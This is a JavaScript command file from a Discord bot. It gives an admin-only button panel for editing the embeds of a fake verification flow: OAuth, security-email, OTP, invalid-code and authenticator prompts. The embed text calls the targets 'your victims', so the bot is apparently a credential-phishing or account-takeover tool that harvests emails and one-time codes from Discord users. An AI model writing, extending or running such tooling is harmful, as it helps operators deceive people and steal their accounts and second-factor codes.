const { ActionRowBuilder, ButtonBuilder, ButtonStyle } = require("discord.js")
const { description } = require("../../Commands/users/settings")

module.exports = {
    name: "editembeds",
    adminOnly: true,
    callback: async (client, interaction) => {
        return interaction.reply({
            embeds: [{
                title: `Which embed do you want to change?`,
                description: `These are the embeds that will show to your victims.`,
                color: 0xFFFFFF
            }],
            components: [
                new ActionRowBuilder().addComponents(
                    new ButtonBuilder().setCustomId("embeds|main").setLabel("Change Verification Embed").setStyle(ButtonStyle.Primary),
                    new ButtonBuilder().setCustomId("embeds|oauth").setLabel("Change OAuth Embed").setStyle(ButtonStyle.Primary),
                    new ButtonBuilder().setCustomId("embeds|sec").setLabel("Change Security Emails Embed").setStyle(ButtonStyle.Primary),
                    new ButtonBuilder().setCustomId("embeds|res").setLabel("Change Final Response Embed").setStyle(ButtonStyle.Primary),
                ),
                new ActionRowBuilder().addComponents(
                    new ButtonBuilder().setCustomId("embeds|otp").setLabel("Change OTP Disabled Embed").setStyle(ButtonStyle.Danger),
                    new ButtonBuilder().setCustomId("embeds|invalid").setLabel("Change Invalid Code Embed").setStyle(ButtonStyle.Danger),
                    new ButtonBuilder().setCustomId("embeds|invalid email").setLabel("Change Invalid Email Embed").setStyle(ButtonStyle.Danger),
                    new ButtonBuilder().setCustomId("embeds|account doesn't exist").setLabel("Change Account doesn't exist Embed").setStyle(ButtonStyle.Danger),
                ),
                new ActionRowBuilder().addComponents(
                    new ButtonBuilder().setCustomId("embeds|authenticator").setLabel("Change Authenticator Embed").setStyle(ButtonStyle.Secondary)
                )],
            ephemeral: true
        })
    }
}